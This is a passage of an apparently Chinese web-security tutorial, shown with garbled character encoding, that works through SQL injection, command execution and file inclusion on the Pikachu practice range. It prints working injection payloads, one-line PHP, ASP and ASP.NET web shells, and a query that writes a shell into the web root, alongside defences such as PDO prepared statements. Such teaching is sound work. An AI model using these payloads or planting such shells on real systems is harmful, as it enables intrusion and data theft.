![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff9d5efa8d1124c228cde9767a0a82772.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å°†å…¶å‘é€åˆ°Repeaterã€‚æˆ‘ä»¬å¯ä»¥æŠŠidæ„æˆé—­åˆã€‚

    1 or updatexml(1,concat(0x7e,database()),0)
    
        

é€‰ä¸­å³é”®ï¼Œconvert selectionï¼Œå¯¹å…¶è¿›è¡Œurlç¼–ç ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb83d635c0586408396c0a3f872266eeb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æŒ‰ç…§æˆ‘ä»¬çš„æœŸæœ›è¿”å›äº†æ•°æ®åº“åç§°ã€‚-
**extractvalue()**-
extractvalue()å‡½æ•°ä½œç”¨:ä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²ã€‚-
è¯­æ³•: ExtractValue(xm| \_document, xpath. string)

> ç¬¬ä¸€ä¸ªå‚æ•°: XML documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°,æ–‡ä¸­ä¸ºDoc-
> ç¬¬äºŒä¸ªå‚æ•°: XPath\_ string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)

Xpathå®šä½å¿…é¡»æ˜¯æœ‰æ•ˆçš„,å¦åˆ™ä¼šå‘ç”Ÿé”™è¯¯ã€‚-
æ‰“å¼€å­—ç¬¦å‹æ³¨å…¥ï¼Œè¾“å…¥payloadã€‚

    kobe' and extractvalue(0,concat(0x7e,version()))#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbe582abc108c4a6a9d34d5cd3cb7cb7d.png)-
æ•ˆæœå·®ä¸å¤šï¼Œç†è§£å³å¯ã€‚-
**floor()**-
åœ¨å­—ç¬¦å‹ä¸­è¾“å…¥payloadå¾—åˆ°ç‰ˆæœ¬å·ã€‚

    kobe' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1b5ecc996e07424eaffcee5a18f28fa9.png)-
åŒæ ·è¿›è¡Œæ›¿æ¢æˆ‘ä»¬å¯ä»¥å¾—åˆ°å…¶ä»–ä½ æƒ³çŸ¥é“çš„ä¸œè¥¿ã€‚

#### 3.4.6SQLæ³¨å…¥æ¼æ´-åŸºäºhttp headerçš„æ³¨å…¥

> ä»€ä¹ˆæ˜¯Http Headeræ³¨å…¥-
> æœ‰äº›æ—¶å€™ï¼Œåå°å¼€å‘äººå‘˜ä¸ºäº†éªŒè¯å®¢æˆ·ç«¯å¤´ä¿¡æ¯(æ¯”å¦‚å¸¸ç”¨çš„cookieéªŒè¯)-
> æˆ–è€…é€šè¿‡http headerå¤´ä¿¡æ¯è·å–å®¢æˆ·ç«¯çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚useragentã€acceptå­—æ®µç­‰ç­‰ã€‚-
> ä¼šå¯¹å®¢æˆ·ç«¯çš„http headerä¿¡æ¯è¿›è¡Œè·å–å¹¶ä½¿ç”¨SQLè¿›è¡Œå¤„ç†,å¦‚æœæ­¤æ—¶æ²¡æœ‰è¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´åŸºäºhttp headerçš„SQL Injectæ¼æ´ã€‚

ç‚¹å‡»æç¤ºï¼Œè·å¾—è´¦å·å¯†ç ï¼Œç™»å½•è´¦å·ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ffdd5008463a84af09fa2c0c054869809.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åå°å¯¹HTTPå¤´æ•°æ®è¿›è¡Œäº†è·å–ï¼Œè¿›è¡Œäº†ç›¸å…³çš„æ•°æ®åº“æ“ä½œã€‚-
æˆ‘ä»¬é€šè¿‡burpçš„æ•°æ®åŒ…è¿›è¡Œæµ‹è¯•ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fafa166a26af4446b8081ef8827fbc1f4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å°†å…¶å‘é€åˆ°repeaterã€‚ä¿®æ”¹agentä¸ºå•å¼•å·æäº¤ï¼ŒæŸ¥çœ‹ç»“æœã€‚

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F463103265b4c43399bd21bcfdb0e2851.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åˆ¤æ–­æœ‰SQLæ³¨å…¥æ¼æ´ã€‚è¾“å…¥æˆ‘ä»¬çš„payload

    firefox' or updatexml(1,concat(0x7e,database()),0) or '
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7a3693dc49f5446e93acd83dd2125888.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¿”å›äº†æ•°æ®åº“åç§°ã€‚

#### 3.4.7SQLæ³¨å…¥æ¼æ´-ç›²æ³¨( boolian base )åŸç†åŠæµ‹è¯•

ä»€ä¹ˆæ˜¯ç›²æ³¨ï¼Ÿ-
åœ¨æœ‰äº›æƒ…å†µä¸‹,åå°ä½¿ç”¨äº†é”™è¯¯æ¶ˆæ¯å±è”½æ–¹æ³•(æ¯”å¦‚@ )å±è”½äº†æŠ¥é”™-
æ­¤æ—¶æ— æ³•åœ¨æ ¹æ®æŠ¥é”™ä¿¡æ¯æ¥è¿›è¡Œæ³¨å…¥çš„åˆ¤æ–­ã€‚-
è¿™ç§æƒ…å†µä¸‹çš„æ³¨å…¥ï¼Œç§°ä¸ºâ€œç›²æ³¨"-
æ ¹æ®è¡¨ç°å½¢å¼çš„ä¸åŒï¼Œç›²æ³¨åˆåˆ†ä¸ºbased booleanå’Œbased timeä¸¤ç§ç±»å‹

åŸºäºbooleançš„ç›²æ³¨ä¸»è¦è¡¨ç°ç—‡çŠ¶:

> 0.æ²¡æœ‰æŠ¥é”™ä¿¡æ¯-
> 1.ä¸ç®¡æ˜¯æ­£ç¡®çš„è¾“å…¥ï¼Œè¿˜æ˜¯é”™è¯¯çš„è¾“å…¥ï¼Œéƒ½åªæ˜¾ç¤ºä¸¤ç§æƒ…å†µ(æˆ‘ä»¬å¯ä»¥è®¤ä¸ºæ˜¯0æˆ–è€…1)-
> 2.åœ¨æ­£ç¡®çš„è¾“å…¥ä¸‹ï¼Œè¾“å…¥and 1= 1/and 1= 2å‘ç°å¯ä»¥åˆ¤æ–­

æ‰“å¼€Booleançš„ç›²æ³¨ï¼Œè¾“å…¥

    kobe' and 1=1#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcfe01df3f27f4cdfb908574ed8106d7f.png)-
æ‰“å°äº†æ­£ç¡®çš„kobeçš„ä¿¡æ¯ã€‚æˆ‘ä»¬å†æŠŠä¸€æ”¹æˆäºŒè¾“å…¥ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd834506f305843898221bf1089c3255d.png)-
å¯¹æ¯”è¯´æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚æˆ‘ä»¬å°è¯•ä¹‹å‰çš„æ–¹æ³•å‘ç°éƒ½è¡Œä¸é€šã€‚

    kobe' and ascii(substr(database(),1,1))>113#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fd2057504e8944030b0270128a97a5917.png)-
æŸ¥è¯¢ä¸å­˜åœ¨ï¼Œæ”¹ä¸º=112ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F755401f53d69421a8284e590f40d945a.png)-
æ˜¾ç¤ºæ­£ç¡®ä¿¡æ¯ã€‚-
112å¯¹åº”çš„å­—æ¯å°±æ˜¯p,æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯pã€‚ä¾æ¬¡ä¿®æ”¹å¾—åˆ°æ•°æ®åº“åå­—ã€‚ä¹‹åæ€è·¯å°±æ‰“å¼€äº†ã€‚

#### 3.4.8SQLæ³¨å…¥æ¼æ´ç›²æ³¨( time base )åŸç†åŠæµ‹è¯•

å¦‚æœè¯´åŸºäºbooleançš„çª—æ³¨åœ¨é¡µé¢ä¸Šè¿˜å¯ä»¥çœ‹åˆ°0 or 1çš„å›æ˜¾çš„è¯-
é‚£ä¹ˆåŸºäºtimeçš„ç›²æ³¨å®Œå…¨å°±å•¥éƒ½çœ‹ä¸åˆ°äº†!-
ä½†è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œå°±æ˜¯â€œæ—¶é—´â€ï¼Œ é€šè¿‡ç‰¹å®šçš„è¾“å…¥ï¼Œåˆ¤æ–­åå°æ‰§è¡Œçš„æ—¶é—´,ä»è€Œç¡®è®¤æ³¨å…¥!-
å¸¸ç”¨çš„Teat Payload:-
kobeâ€™ and sleep(5)#-
çœ‹çœ‹è¾“å…¥: kobeå’Œè¾“å…¥kobe and sleep(5)#çš„åŒºåˆ«,ä»è€Œåˆ¤æ–­è¿™é‡Œå­˜åœ¨based timeçš„SQLæ³¨å…¥æ¼æ´ã€‚-
æ‰“å¼€åŸºäºæ—¶é—´çš„ç›²æ³¨ã€‚è¾“å…¥å•å¼•å·ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9bec6a484fdf4f068d32f1b4b288da39.png)-
æˆ‘ä»¬è¿›è¡Œå…¶ä»–å°è¯•éƒ½æ˜¯ä¸€æ ·çš„ç»“æœã€‚æˆ‘ä»¬æ‰“å¼€webæ§åˆ¶å™¨ã€‚æ‰“å¼€ç½‘ç»œï¼Œè¾“å…¥

    kobe' and sleep(5)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1775a96b65b145f29059a9ebd8ae0030.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

æˆ‘ä»¬å‘ç°é¡µé¢æ²¡æœ‰ç«‹åˆ»è¿”å›å‰ç«¯é¡µé¢ï¼Œè€Œæ˜¯æš‚åœäº†5.12æ¯«ç§’ï¼Œè¯´æ˜æ‰§è¡Œäº†æˆ‘ä»¬çš„payloadã€‚è¯´æ˜å­˜åœ¨ä¸€ä¸ªåŸºäºæ—¶é—´çš„payloadã€‚

    kobe' and if((substr(database(),1,1))='p',sleep(5),null)#
    
        

æ—¶é—´åœæ­¢äº†5ç§’ï¼Œåˆ™è¯´æ˜ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯pã€‚å¦‚æœæ—¶é—´ä¸åœæ­¢ï¼Œåˆ™è¯´æ˜ä¸æ˜¯pã€‚

#### 3.4.9osè¿œç¨‹æ§åˆ¶

**ä¸€å¥è¯æœ¨é©¬**-
ä¸€å¥è¯æœ¨é©¬æ˜¯ä¸€ç§çŸ­å°è€Œç²¾æ‚çš„æœ¨é©¬å®¢æˆ·ç«¯ï¼Œéšè”½æ€§å¥½ï¼Œä¸”åŠŸèƒ½å¼ºå¤§ã€‚-
PHP: < ?php @eval($\_ POSTâ€™chopperâ€™\]);?>-
ASP: < %eval request(" chopper")%>-
ASP.NET: <%@ Page Language= Jscript" %> <%eval(Request.Item"chopper"\], "unsafe );%>

select 1,2 into outfile â€œ/var/www/html/1.txtâ€-
into outfile å°†selectçš„ç»“æœå†™å…¥åˆ°æŒ‡å®šç›®å½•çš„1.txtä¸­-
åœ¨ä¸€äº›æ²¡æœ‰å›æ˜¾çš„æ³¨å…¥ä¸­å¯ä»¥ä½¿ç”¨into outfileå°†ç»“æœå†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œç„¶åè®¿é—®è·å–-
å‰ææ¡ä»¶:-
1.éœ€è¦çŸ¥é“è¿œç¨‹ç›®å½•-
2.éœ€è¦è¿œç¨‹ç›®å½•æœ‰å†™æƒé™-
3.éœ€è¦æ•°æ®åº“å¼€å¯äº†secure\_ file\_ priv-
å­—ç¬¦å‹æ³¨å…¥ï¼š-
è·å–æ“ä½œç³»ç»Ÿæƒé™ï¼š

    kobe' union select "<?php @eval($_GET['test'])?>",2 into outfile "/val/www/html/1.php"#
    
        

#### 3.4.10SQL Injectæ¼æ´ä¹‹è¡¨(åˆ—)åçš„æš´åŠ›ç ´è§£

å­—ç¬¦å‹æ³¨å…¥ä¸¾ä¾‹-
payloadï¼š

    kobe' and exists(select * from aa)#
    kobe' and exists(select id from users)#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb502338b737644fe945aff940dc36b14.png)-
è¾“å…¥ç¬¬ä¸€ä¸ªpayloadï¼Œè¿”å›ç»“æœè¯´æ˜æ²¡æœ‰è¿™ä¸ªè¡¨ã€‚æ‰“å¼€burpæŠ“åŒ…ï¼Œå‘é€åˆ°intrudderã€‚æ€è·¯ä¸æš´åŠ›ç ´è§£ä¸€æ ·ã€‚clearä¹‹åé€‰ä¸­aaï¼Œè¿›è¡Œæ›¿æ¢ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F75bda3ff11d4438d99c44aa44602daca.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç”¨è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å¯ä»¥çŒœå‡ºè¡¨åã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdbdc7f3b58544e1781f5052185fe52d4.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
åŒæ ·çš„æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ç¬¬äºŒä¸ªpayloadçŒœå‡ºåˆ—åã€‚

#### 3.4.11å¦‚ä½•ä½¿ç”¨SQL-Mapè¿›è¡ŒSQL Injectæ¼æ´æµ‹è¯•

å¯ä»¥ç›´æ¥å»å®˜ç½‘ä¸‹è½½å‹ç¼©åŒ…[https://sqlmap.org/](https://sqlmap.org/)-
sqlmapç»å…¸ç”¨æ³•-
ç¬¬ä¸€æ­¥:-
\-u "xxâ€ - cookie= â€œyyâ€ //å¸¦ä¸Šcookieå¯¹URLè¿›è¡Œæ³¨å…¥æ¢æµ‹-
ç¬¬äºŒæ­¥:-
\-U â€œxxxâ€ â€“ cookie=-
â€œyyyâ€ - current-db //å¯¹æ•°æ®åº“åè¿›è¡Œè·å–-
ç¬¬ä¸‰æ­¥:-
\-u "xxxâ€ --cookie= â€œyyâ€ - D pikachu - -tables //å¯¹æ•°æ®åº“çš„è¡¨åè¿›è¡Œæšä¸¾-
ç¬¬å››æ­¥:-
\-u â€œxxxâ€ --cookie= â€œyyyâ€ -D pikachu -T users â€“ columns //å¯¹dvwaåº“é‡Œé¢çš„åä¸ºusersè¡¨çš„åˆ—åè¿›è¡Œæšä¸¾

#### 3.4.12SQLæ³¨å…¥æ¼æ´å¸¸è§é˜²èŒƒæªæ–½

â—ä»£ç å±‚é¢-
1.å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è½¬ ä¹‰å’Œè¿‡æ»¤-
2.ä½¿ç”¨é¢„å¤„ç†å’Œå‚æ•°åŒ– ( Parameterized )-
â—ç½‘è·¯å±‚é¢-
1.é€šè¿‡WAFè®¾å¤‡å¯ç”¨é˜²SQL Injectæ³¨å…¥ç­–ç•¥(æˆ–ç±»ä¼¼é˜²æŠ¤ç³»ç»Ÿ)-
2.äº‘ç«¯é˜²æŠ¤( 360ç½‘ç«™å«å£«,é˜¿é‡Œäº‘ç›¾ç­‰)-
PHPé˜²èŒƒè½¬ä¹‰+è¿‡æ»¤

> è½¬ä¹‰ä¸¾ä¾‹
> 
>     function escape($link, $data){
>     if(is_ string($data)){
>     return mysqli_ real_ escape_ string($ink, $data) ;
>     }
>     if(is_ array($data)){
>     foreach ($data as $key=>$va1){ 
>     $data[$key]=e S cape($link, $val);
>     }
>     }
>     return $data;
>     }
>     
>          

> è¿‡æ»¤ä¸¾ä¾‹ï¼š(é»‘åå•)
> 
>     str_ replace("%",",$_ POST['username ]),æŠŠposté‡Œé¢çš„æ•°æ®é‡Œé¢å«æœ‰%çš„æ›¿æ¢æˆç©º
>     
>          

**PDOé¢„å¤„ç†**-
æ¨èåšæ³•ï¼šä½¿ç”¨PDOçš„prepareé¢„å¤„ç†(é¢„å¤„ç†+å‚æ•°åŒ–)

    $username=$_ GET[ ' username' ];
    $password=$_ GET[ ' password'];
    try{
    $pdo=new PDO( ' mysql : host=localhost ; dbname-ant', ' root'ï¼Œ' root');
    $sq1="select * from admin where username=? and passowrd=?" ;
    $stmt=$pdo->prepare ($sql);//å…ˆä¸ä¼ å‚æ•°ï¼Œå…ˆé¢„å¤„ç†
    //var_ dump($stmt);
    $stmt-> execute(array($username ï¼Œ$password));
    / /è¿™ä¸ªæ—¶å€™åœ¨æŠŠå‚æ•°ä¼ è¿›å»ï¼Œä»¥ç´¢å¼•æ•°ç»„çš„æ–¹å¼ä¼ è¿›å»ï¼Œè€Œä¸æ˜¯æ‹¼æ¥ï¼Œå°±æˆåŠŸé˜²æ­¢äº†æ³¨å…¥
    }catch (PDOException $e){
    echo $e- >getMessage();
    ?>
    
    
        

ç½‘ç»œé˜²æŠ¤-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F53e76687176340a79ea487535764cce7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F286ab9fc70bf46d5adb03706cefc47d7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

## 3.5RCEï¼ˆä»£ç æ‰§è¡Œ/å‘½ä»¤æ‰§è¡Œï¼‰

RCE(remote command/code execute)æ¦‚è¿°-
RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚-
è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ-
ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£-
æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š-
ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨-
ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡"è‡ªåŠ¨åŒ–è¿ç»´å¹³å°"è¿›è¡Œæ“ä½œã€‚ åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„"æ”¶è·"-\_-

    è¿œç¨‹ä»£ç æ‰§è¡Œ
    åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚ 
    å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚ 
    
        

æ‰“å¼€pikachué¶åœºexec"ping"ï¼Œå¯ä»¥å…ˆè¯•ä¸€ä¸‹æœ¬åœ°åœ°å€ï¼Œping127.0.0.1ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F007ac6d2ceaf47f4a00bc99f0ca29c87.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
pingå‡ºæ¥çš„ç»“æœå¾ˆæ­£å¸¸ï¼Œä½†æ˜¯è¿™ä¸ªä¸­æ–‡å…¨å˜æˆä¹±ç äº†ã€‚/(ã„’oã„’)/~~-
æŸ¥çœ‹æºç ï¼Œå‘ç°å¯¹è¾“å…¥æ²¡æœ‰å¤„ç†ä¹‹åæˆ‘ä»¬è¿˜æ˜¯ä¸€æ‰‹æ‹¼æ¥

    127.0.0.1 & ipconfig
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7b490d70de1349318c34845ddc71c2cd.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ä¾æ—§ä¹±ç ï¼Œä¸è¿‡ç»“æœä¸€æ ·ï¼Œè¯´æ˜è¿™é‡Œé™¤äº†å¯ä»¥æäº¤ç›®æ ‡IPåœ°å€å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸€äº›æ‹¼æ¥çš„ç¬¦å·æ‰§è¡Œå…¶ä»–çš„å‘½ä»¤ã€‚

exec"evel"ï¼Œæ›´ç®€å•ã€‚éšæ„è¾“å…¥å­—ç¬¦ï¼Œè¿”å›æ–‡å­—ã€‚-
eval(è¾“å…¥)ä¹Ÿå°±æ˜¯æ‰§è¡Œä»»ä½•æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œè¾“å…¥phpinfo();-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8231e96001df4ad68c6d94e7edff8420.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
é‚£ä¹ˆè¿™é‡Œå­¦ä¹ ä¸€ä¸ªphpå‡½æ•°-
system("")æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡ºã€‚

## 3.6Files Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)

#### 3.6.1æ–‡ä»¶åŒ…å«åŸç†åŠæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´

æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°-
åœ¨webåå°å¼€å‘ä¸­ï¼Œç¨‹åºå‘˜å¾€å¾€ä¸ºäº†æé«˜æ•ˆç‡ä»¥åŠè®©ä»£ç çœ‹èµ·æ¥æ›´åŠ ç®€æ´ï¼Œä¼šä½¿ç”¨â€åŒ…å«"å‡½æ•°åŠŸèƒ½ã€‚-
æ¯”å¦‚æŠŠä¸€ç³»åˆ—åŠŸèƒ½å‡½æ•°éƒ½å†™è¿›fuction.phpä¸­,ä¹‹åå½“æŸä¸ªæ–‡ä»¶éœ€è¦è°ƒç”¨çš„æ—¶å€™å°±ç›´æ¥åœ¨æ–‡ä»¶å¤´ä¸­å†™ä¸Š-
ä¸€å¥<?php include fuction.php?>å°±å¯ä»¥è°ƒç”¨å‡½æ•°ä»£ç ã€‚-
